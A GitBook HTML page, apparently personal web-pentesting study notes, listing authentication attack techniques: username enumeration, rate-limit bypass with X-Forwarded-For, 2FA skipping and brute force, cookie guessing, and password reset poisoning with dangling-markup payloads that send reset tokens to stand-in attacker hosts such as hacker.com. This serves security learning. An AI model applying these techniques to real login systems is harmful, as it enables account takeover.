@@ -1,0 +1,705 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Authentication Flaws · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="DirectoryTraversal.html" />
+    
+    
+    <link rel="prev" href="AccessControl.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Author
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Linux</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../Linux/1-Basics/">
+            
+                <a href="../../Linux/1-Basics/">
+            
+                    
+                    Basics
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../Linux/1-Basics/1-exploring.html">
+            
+                <a href="../../Linux/1-Basics/1-exploring.html">
+            
+                    
+                    Exploring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../../Linux/1-Basics/2-navigation.html">
+            
+                <a href="../../Linux/1-Basics/2-navigation.html">
+            
+                    
+                    Navigation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../../Linux/1-Basics/3-manipulatingFilesAndDirectories.html">
+            
+                <a href="../../Linux/1-Basics/3-manipulatingFilesAndDirectories.html">
+            
+                    
+                    Manipulating files and directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../../Linux/1-Basics/4-workingWithCommands.html">
+            
+                <a href="../../Linux/1-Basics/4-workingWithCommands.html">
+            
+                    
+                    Working with commands
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../../Linux/1-Basics/5-redirection.html">
+            
+                <a href="../../Linux/1-Basics/5-redirection.html">
+            
+                    
+                    Redirection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../../Linux/1-Basics/6-expansionsAndQuotes.html">
+            
+                <a href="../../Linux/1-Basics/6-expansionsAndQuotes.html">
+            
+                    
+                    Expansions and quotes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../../Linux/1-Basics/7-advanceKeyboardTricks.html">
+            
+                <a href="../../Linux/1-Basics/7-advanceKeyboardTricks.html">
+            
+                    
+                    Advance keyboard tricks
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../../Linux/1-Basics/8-permissions.html">
+            
+                <a href="../../Linux/1-Basics/8-permissions.html">
+            
+                    
+                    Permissions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../../Linux/1-Basics/9-processes.html">
+            
+                <a href="../../Linux/1-Basics/9-processes.html">
+            
+                    
+                    Processes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.10" data-path="../../Linux/1-Basics/10-environment.html">
+            
+                <a href="../../Linux/1-Basics/10-environment.html">
+            
+                    
+                    Environment
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.11" data-path="../../Linux/1-Basics/11-vi.html">
+            
+                <a href="../../Linux/1-Basics/11-vi.html">
+            
+                    
+                    Vi
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.12" data-path="../../Linux/1-Basics/12-customizingOurPrompt.html">
+            
+                <a href="../../Linux/1-Basics/12-customizingOurPrompt.html">
+            
+                    
+                    Prompt cutomization
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../Linux/2-TasksAndTools/">
+            
+                <a href="../../Linux/2-TasksAndTools/">
+            
+                    
+                    Tasks and tools
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../Linux/2-TasksAndTools/1-packagingSystems.html">
+            
+                <a href="../../Linux/2-TasksAndTools/1-packagingSystems.html">
+            
+                    
+                    Packaging systems
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../Linux/2-TasksAndTools/2-storageMedia.html">
+            
+                <a href="../../Linux/2-TasksAndTools/2-storageMedia.html">
+            
+                    
+                    Storage media
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../../Linux/2-TasksAndTools/3-networking.html">
+            
+                <a href="../../Linux/2-TasksAndTools/3-networking.html">
+            
+                    
+                    Networking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../../Linux/2-TasksAndTools/4-searchForFiles.html">
+            
+                <a href="../../Linux/2-TasksAndTools/4-searchForFiles.html">
+            
+                    
+                    Searching for files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.5" data-path="../../Linux/2-TasksAndTools/5-archivingAndBackup.html">
+            
+                <a href="../../Linux/2-TasksAndTools/5-archivingAndBackup.html">
+            
+                    
+                    Archiving and backup
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Web</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Server Side
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="AccessControl.html">
+            
+                <a href="AccessControl.html">
+            
+                    
+                    Access Control Flaws
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="3.1.2" data-path="AuthenticationFlaws.html">
+            
+                <a href="AuthenticationFlaws.html">
+            
+                    
+                    Authentication Flaws
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.3" data-path="DirectoryTraversal.html">
+            
+                <a href="DirectoryTraversal.html">
+            
+                    
+                    Directory Traversal
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.4" data-path="InformationDisclosure.html">
+            
+                <a href="InformationDisclosure.html">
+            
+                    
+                    Information Disclosure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.5" data-path="OS-Command-Injection.html">
+            
+                <a href="OS-Command-Injection.html">
+            
+                    
+                    OS Command Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.6" data-path="SQLI.html">
+            
+                <a href="SQLI.html">
+            
+                    
+                    SQL Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.7" data-path="SSRF.html">
+            
+                <a href="SSRF.html">
+            
+                    
+                    Server Side Request Forgery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.8" data-path="XXE.html">
+            
+                <a href="XXE.html">
+            
+                    
+                    XML External Entities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Authentication Flaws</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="password-based-login">Password based login:</h2>
+<h3 id="different-response">Different response:</h3>
+<ul>
+<li>Check for different response if correct username is entered</li>
+<li>Check for different response code</li>
+<li>Check for different response length</li>
+</ul>
+<h3 id="subtly-different-response">Subtly different response:</h3>
+<ul>
+<li>Sometimes the correct creds induce a very minor change in response</li>
+</ul>
+<h3 id="enumeration-through-response-timing">Enumeration through response timing:</h3>
+<ul>
+<li>input a long ass password so that the correct username takes longer to process</li>
+<li>X-Forwarded-For header to bypass rate limiting through IP</li>
+</ul>
+<h3 id="ip-block-bypass-by-providing-correct-creds">IP Block bypass by providing correct creds:</h3>
+<ul>
+<li>In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully</li>
+</ul>
+<h3 id="enumeration-through-account-locking">Enumeration through account locking:</h3>
+<ul>
+<li>If one username is attempted multiple times the account might get locked implying that the username is valid.</li>
+</ul>
+<h3 id="if-data-is-being-sent-in-json-format">If Data is being sent in JSON format:</h3>
+<ul>
+<li>Try sending a list of passwords.</li>
+</ul>
+<h2 id="2fa-bypass">2FA Bypass:</h2>
+<h3 id="bypass-2fa-entirely">Bypass 2FA entirely:</h3>
+<ul>
+<li>Try to skip the 2FA step completely by skipping that request and accessing the latter page.</li>
+</ul>
+<h3 id="-bypass-2fa-by-brute-force">- Bypass 2FA by brute-force</h3>
+<ul>
+<li>If you get a guessable cookie after the first authentication step, you can try to guess that cookie for another account and also brute-force their 2FA code.</li>
+</ul>
+<h2 id="other-authentication-functionalities">Other Authentication functionalities:</h2>
+<h3 id="stay-logged-in-cookie">Stay-Logged-in cookie:</h3>
+<ul>
+<li>If you can figure out the construction of the stay-logged-in cookie you can possibly access other accounts, sometimes they are a mix of usernames, passwords and timestamps, encoded in base64 or something else. Try to understand the logic and brute-force the cookie.</li>
+</ul>
+<h3 id="offline-password-cracking">Offline password cracking:</h3>
+<ul>
+<li>If you can get hold of the cookie of the victim for example through XSS. You can then try to crack it if you know the logic with which it was created. Or try to brute-force it.</li>
+</ul>
+<h3 id="password-reset">Password reset:</h3>
+<ul>
+<li>The attacker can request the password reset form from his own account and change the username to victims, if that doesn&apos;t work he can try to remove the password reset token from the request completely.</li>
+</ul>
+<h3 id="-password-reset-poisoning">- Password reset poisoning:</h3>
+<ul>
+<li><p>Try changing the host header to sub.evil-user.net (Attacker controlled domain) or try changing incorporating the X-Forwarded-Host header with the value sub.evil-user.com (Attacker controlled domain)</p>
+</li>
+<li><p>You can also try to reset the password via dangling markup, just try to inject dangling html inside the Host header or X-Forwarded-Host header. </p>
+</li>
+<li>Example: &quot;&gt;&lt;img src=&quot;<a href="https://hacker.com/?" target="_blank">https://hacker.com/?</a></li>
+<li>Or if it raises an error try to inject it inside the port value.</li>
+<li>Example: Host: normal-website.com:arbitraryport&quot;&lt;a href=&quot;<a href="https://attacker.com/?" target="_blank">https://attacker.com/?</a></li>
+</ul>
+<h3 id="password-reset-form">Password reset form:</h3>
+<ul>
+<li>Most password forms have three input fields, current password and new password(x2), we can try bruteforcing the current password of any other user through here.</li>
+</ul>
+<h3 id="version-control-history">Version control history</h3>
+<ul>
+<li>Virtually all websites are developed using some form of version control system, such as Git. By default, a Git project stores all of its version control data in a folder called .git. Occasionally, websites expose this directory in the production environment. In this case, you might be able to access it by simply browsing to /.git.</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="AccessControl.html" class="navigation navigation-prev " aria-label="Previous page: Access Control Flaws">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="DirectoryTraversal.html" class="navigation navigation-next " aria-label="Next page: Directory Traversal">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Authentication Flaws","level":"3.1.2","depth":2,"next":{"title":"Directory Traversal","level":"3.1.3","depth":2,"path":"Web/ServerSideTopics/DirectoryTraversal.md","ref":"./Web/ServerSideTopics/DirectoryTraversal.md","articles":[]},"previous":{"title":"Access Control Flaws","level":"3.1.1","depth":2,"path":"Web/ServerSideTopics/AccessControl.md","ref":"./Web/ServerSideTopics/AccessControl.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["collapsible-chapters","livereload"],"pluginsConfig":{"collapsible-chapters":{},"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Web/ServerSideTopics/AuthenticationFlaws.md","mtime":"2022-03-13T04:28:44.057Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-03-13T04:33:14.983Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
